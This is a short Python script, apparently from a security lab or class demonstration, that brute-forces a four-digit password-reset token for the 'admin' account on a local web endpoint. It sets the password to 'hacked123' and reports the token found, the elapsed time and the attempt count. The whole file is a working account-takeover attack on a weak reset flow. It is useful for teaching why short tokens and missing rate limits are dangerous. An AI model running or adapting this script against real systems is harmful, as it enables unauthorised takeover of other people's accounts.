import requests
import time

url = "http://127.0.0.1:5000/reset-confirm"
username = "admin"

debut = time.time()

for token in range(1000, 10000):
    r = requests.get(url, params={
        "username": username,
        "token": str(token),
        "nouveau_mdp": "hacked123"
    })
    if r.status_code == 200:
        fin = time.time()
        print(f"Token trouvé : {token}")
        print(r.text)
        print(f"\nTemps écoulé : {fin - debut:.2f} secondes")
        print(f"Nombre d'essais : {token - 1000 + 1}")
        break